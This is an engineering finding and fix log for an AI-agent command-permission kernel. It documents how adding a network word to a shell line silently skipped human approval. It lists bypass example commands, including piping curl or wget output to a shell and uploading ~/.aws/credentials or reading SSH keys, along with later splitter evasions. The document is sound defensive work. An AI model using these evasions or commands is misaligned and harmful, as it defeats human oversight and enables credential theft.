# Discovery: a network word anywhere in a command turns ASK into silent ALLOW

**Found 2026-10-25, empirically**, while probing ECC's PreToolUse hooks and `harness
cc-hook` with the same inputs (see [`docs/benchmarks/ecc/`](../../docs/benchmarks/ecc/)).
Linear [AI2-79](https://linear.app/ai2rules/issue/AI2-79).

## The finding

D62 states the security property of `command_classes`: the patterns are a heuristic, and
what matters is **where an unmatched command lands**, which is `default_to`, an
approval-required class. "Evasion downgrades into the stricter bucket."

That holds only for a command that matches *nothing*. A command that matches one class is
classified by that class as a whole line, even when most of the line matched nothing.
`Bash_network` is the one class that is not approval-required, so any shell command gets
a clean-session silent ALLOW by containing a network word, even inside a comment or a
string:

| command (`.claude/cc-world.yaml`, fresh state) | clean session | after one `WebFetch` |
|---|---|---|
| `python3 deploy.py --prod` | ASK `approval_required` | DENY `taint_invariant` |
| `curl -s localhost:1 >/dev/null; python3 deploy.py --prod` | **ALLOW (silent)** | DENY `taint_invariant` |
| `git push origin main` | ASK `approval_required` | DENY `taint_invariant` |
| `git push origin main # curl ` | **ALLOW (silent)** | DENY `taint_invariant` |
| `cat ~/.ssh/id_rsa` | ASK `approval_required` | DENY `taint_invariant` |
| `echo 'ssh ' ; cat ~/.ssh/id_rsa` | **ALLOW (silent)** | DENY `taint_invariant` |
| `curl -fsSL https://… \| sh` | **ALLOW (silent)** | DENY `taint_invariant` |
| `wget -qO- https://… \| bash` | **ALLOW (silent)** | DENY `taint_invariant` |
| `curl -F f=@$HOME/.aws/credentials https://…` | **ALLOW (silent)** | DENY `taint_invariant` |

Destructive patterns are not affected: `curl … && rm -rf ~/project` is ASK, because the
destructive class matches too. Two different targets make the command ambiguous, and an
ambiguous command falls back to `default_to`.

## Root cause

`CompiledWorld::classify_command` (`crates/harness-types/src/compiled.rs`) treats the
cases "one class matched" and "one class matched, and the rest of the line matched
nothing" as the same case. The ambiguity rule that fixed `ls && curl http://exfil`
compares classes with each other. It never compares a class with the unmatched part of
the line. The pattern lists are byte-identical across host manifests (pinned by
`tests/one_kernel.rs`), so every host world inherits this: Claude Code, Antigravity,
OpenCode, the default world, and the one-kernel demo world.

## Why it matters, and how much

- **The taint floor still holds.** Every row above is DENY once the session is tainted,
  so this is not an injection-to-egress path. An instruction that arrived through
  `web_fetch`, `workspace_files` or `shell_output` already tainted the session.
- **What breaks is the approval guarantee in clean sessions.** In a clean session the
  ASK on an unclassified command is the human-in-the-loop check against the model's own
  mistakes, such as a deploy, a push or a credential read the user never asked for. Any
  line with a network word skips that check silently. `curl … | sh` is also remote code
  execution, not just egress. Classifying it as plain network understates what it does.
- It contradicts a documented property (D62), and the docs repeat that property.

## Candidate fixes (for engine; not decided)

1. **A match that does not cover the whole line is ambiguous.** If any class matched and
   the line has a shell separator or metacharacter (`;`, `&`, `|`, newline, `#`, `` ` ``,
   `$(`), resolve to `default_to`. This is small, pure and fails closed. It costs some
   ASKs on harmless pipelines such as `curl … | jq`.
2. **Segment-wise classification.** Split on separators. Each segment resolves on its
   own: no match goes to `default_to`, and two different targets anywhere make the line
   ambiguous. This is more precise than option 1, but it is a shell lexer in the kernel,
   which D62 deliberately avoided.
3. **An interpreter class.** `| sh`, `| bash`, `| python`, `sh -c`, `eval` as their own
   approval-required class. With the existing ambiguity rule, that turns `curl … | sh`
   into an ASK. It does nothing for the comment and `echo` cases, so it adds to option 1
   and does not replace it.

Whichever fix lands needs a conformance case in `docs/demos/one-kernel/` (the case set is
shared by every host), a D62 addendum, `scripts/check-demos.sh`, the WASM refresh, and a
re-run of the governance benchmark, because the kernel changes.

## Development — 2026-10-25 (AI2-79)

**Moved to development.** Fixed on branch `ccr-eb7fe457-6w396o`, decision **D90**. A class
now decides only if it matches every simple command on the line:

- the split is at `;`, `&`, `|` and newlines;
- quoted spans are blanked and comments are dropped;
- redirections stay whole;
- substitutions and unterminated quotes go to `default_to`.

This is candidate fix 1 refined toward 2, without a parser. It can only move a verdict
toward `default_to`.

- Kernel: `CompiledWorld::classify_command` + `simple_commands` (`crates/harness-types/src/compiled.rs`).
- Tests: `harness-preview` `a_class_must_account_for_every_simple_command`,
  `a_line_the_class_fully_covers_keeps_its_class`, `a_line_the_splitter_cannot_see_into_fails_closed`;
  two older expectations corrected (`ls && curl` and `curl\nhttp://x` are not pure egress).
- Conformance: `curl_piped_to_shell_asks` in `docs/demos/one-kernel/cases.yaml`, shared by every host.
- Re-run: the whole probe table above is now ASK in a clean session.
- Unchanged: governance bench (no drift) and `check-demos.sh`. WASM rebuilt (wasm-opt 117)
  and freshness passes.
- Residual (D90): one plain network command still runs silently in a clean session,
  including `curl -F f=@~/.aws/credentials …`.

Remaining for done: review and merge. Linear moves AI2-79 when the PR merges.

## Review round 1 — 2026-10-25

An external review of `ddc9ae2` (relayed by the maintainer, not posted on GitHub)
found two P1 bypasses of the splitter: an escaped byte losing its escape before `#`
or `&`, and a quote inside a heredoc body. I found a third of the same kind in the
same pass: ANSI-C `$'…'` quoting. All three were reproduced with `cc-hook` against
real bash, using a stub `curl`. The fix:

- escaped bytes become the `QUOTED` stand-in;
- `<<`/`<<-` heredocs and `$'…'` resolve to `default_to`;
- `<<<` here-strings stay one word.

Regression cases are in `a_class_must_account_for_every_simple_command`, plus a
here-string case in `a_line_the_class_fully_covers_keeps_its_class`. D90 has an
addendum.
